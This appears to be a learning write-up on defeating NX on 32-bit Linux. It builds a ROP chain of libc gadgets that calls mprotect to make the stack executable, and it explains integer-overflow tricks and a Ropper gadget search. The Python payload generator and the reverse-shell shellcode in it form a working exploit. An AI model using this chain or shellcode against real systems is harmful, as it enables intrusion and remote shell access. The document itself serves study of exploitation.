# Bypass NX using ROP chain to turn a non exec stack into an exec one using mprotect, to exec shellcode 
  
### Gadgets used and their offsets:
- 0x0003b4fc: pop edx; ret;  
- 0x000a07f8: inc edx; ret;  
- 0x000915a3: pop ecx; ret;  
- 0x00184049: pop ebx; ret;  
- 0x0003677d: inc ebx; ret;  
### Other data used:
- stack_size = 0x21000  
- libc_base = 0xf7d75000  
  
  
> The goal here is to fill the buffer with A's and then overflow the stack with gadgets, that we will use, one by one, in chain, to trigger instructions that will fill the registers EDX, ECX and EBX, and then jump into the middle of `mprotect()` *(to skip the automatic filling of the registers part, so only our data is set into them)*. This will execute `mprotect()` and turn the stack into an executable one. Then, we will use a `jmp esp;` gadget to jump to ESP and executes our shellcode, which gives us a reverse shell.
## The Python program used:
```Python
#!/usr/bin/python3  
from pwn import p32  

libc_base = 0xf7d75000  
  
junk = b"A" * 268    
  
# this rop chain could have been done much simpler by pushin on the stack 0x7 instead of 0xffffffff (which we then need to increment), but i prefer to do it like this to really "cement" the idea in my mind.  
rop = b"".join([  
	p32(libc_base + 0x0003b4fc), # pop edx; ret;  
	p32(0xffffffff), # will be popped in edx  
	p32(libc_base + 0x000a07f8), # inc edx; ret; => EDX contains 0x0  
	p32(libc_base + 0x000a07f8),  
	p32(libc_base + 0x000a07f8),  
	p32(libc_base + 0x000a07f8),  
	p32(libc_base + 0x000a07f8),  
	p32(libc_base + 0x000a07f8),  
	p32(libc_base + 0x000a07f8),  
	p32(libc_base + 0x000a07f8), # EDX contains 0x7  
	p32(libc_base + 0x000915a3), # pop ecx; ret;  
	p32(0x01010101), # length of area to apply the rights too, popped in ECX  
	p32(libc_base + 0x00184049), # pop ebx; ret;  
	p32(0xfffdbfff), # popped in EBX, to be inc right after (to avoid nullbytes)  
	p32(libc_base + 0x0003677d), # inc ebx; ret; => EBX contains 0xfffdc000 (stack base address)  
	p32(0xf7e8f0dd), # <mprotect+13> aka right before the syscall executes  
	p32(0x42424242), # this will be popped in EBX, now stack is executable  
	p32(libc_base + 0x00119917) # jmp esp;  
])  
  
shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x02\xb1\x01\x66\xb8\x67\x01\xcd\x80\x89\xc3\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\x31\xc0\x66\xb8\x6a\x01\xcd\x80\x31\xc0\x31\xc9\xb0\x3f\xcd\  
x80\x31\xc0\xb1\x01\xb0\x3f\xcd\x80\x31\xc0\xb1\x02\xb0\x3f\xcd\x80\x31\xc0\x31\xd2\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"  
  
payload = junk + rop + shellcode  
  
with open("payload", "wb") as f:  
	f.write(payload)
```
  
## EDX setup:  
  
- Goal is to have `0x7` on top of the stack, to right after `pop` it into EDX.
- We could push `0x7` straight onto the stack, by inserting it directly right after our 268 `A`, but we'll do something different because i know very well that you wanna read about a concept i recently heard about: **Integer Overflow**  
	- in 32 bits systems, the maximum value an **Unsigned integer** can have is `0xffffffff`.  
	- Now, what happens when we add 1 to this value ? How can we add to a maximum value ? Doesn't make sense right ? But, if we can, what happens ??! 
	- *Yes, we can*: `0xffffffff + 1 = 0x100000000` ... but this is not 0 !!
	- Well, in 32-bit systems, only 32 bits are stored ... makes sense ... so why do we have 9 numbers displayed here, and not 8 like it should be ? Well, the system will interpret this value, and *wrap* around, to remove the extra `1` and turning the value into `0x00000000`. And this ... is called an **unsigned integer overflow**: exceeding the maximum representable value causes a wrap-around to zero.  
- So our goal, will be to add `1` eight times in a row, in order to go from `0xffffffff` to `0x7`.
- To add `1` to EDX we will use a gadget that increments it. This gadget will be `inc edx; ret;`  
- First (this can seem counterintuitive but ...) we need to push the gadget `pop edx; ret;` on the stack, so when ESP is pointing at it, it "understands" *Ok at the next instruction, i'll pop whatever value is there, into EDX*.
- Both gadgets offset addresses (compared to the libc base address) can be found using Ropper:  
```bash  
(ropper)> file /usr/lib32/libc.so.6  
...
(libc.so.6/ELF/x86)> search /1/ inc edx  
0x000a07f8: inc edx; ret;  
(libc.so.6/ELF/x86)> search /1/ pop edx  
0x0003b4fc: pop edx; ret;  
```  
- We know the libc_base address: `0xf7d75000`. We'll use this value to access all our gadgets: 
	- `pop edx; ret;` gadget offset = `0x0003b4fc`  
	- `pop edx; ret;` global address = `0xf7d75000` + `0x0003b4fc`
  
* Then, we want to increase the value contained in EDX to 0x7, so we'll use the `inc edx; ret;` gadget:
	* `inc edx; ret;` gadget offset = `0x000a07f8`
	* `inc edx; ret;` global address = `0xf7d75000` + `0x000a07f8`

| STACK ||  
|----------------|-------------------------------|  
|A * 268 | => filling the buffer until rbp  
|`0xf7d75000` + `0x0003b4fc` | => `pop edx; ret` gadget will be placed on top of stack  
|0xffffffff | => 0xffffffff will be placed on top of stack to be used by `pop edx`  
|`0xf7d75000` + `0x000a07f8` | => `inc edx; ret` gadget
|0xF7E157F8 | => goal is to keep incrementing until EDX contains `0x7` 
|0xF7E157F8 |  
|0xF7E157F8 |  
|0xF7E157F8 |  
|0xF7E157F8 |  
|0xF7E157F8 |  
|0xF7E157F8 | => EDX now contains `0x7`
